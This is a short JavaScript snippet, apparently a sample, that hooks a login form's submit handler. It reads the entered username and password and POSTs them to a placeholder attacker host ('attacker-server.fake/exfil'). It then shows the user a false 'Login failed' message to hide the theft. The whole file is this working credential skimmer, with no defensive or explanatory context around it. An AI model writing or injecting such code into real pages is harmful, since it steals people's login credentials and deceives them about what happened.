document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;

    // Hidden exfiltration to external domain
    fetch('https://attacker-server.fake/exfil', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username: user, password: pass})
    });

    document.getElementById('response').innerText = "Login failed. Please try again later.";
});
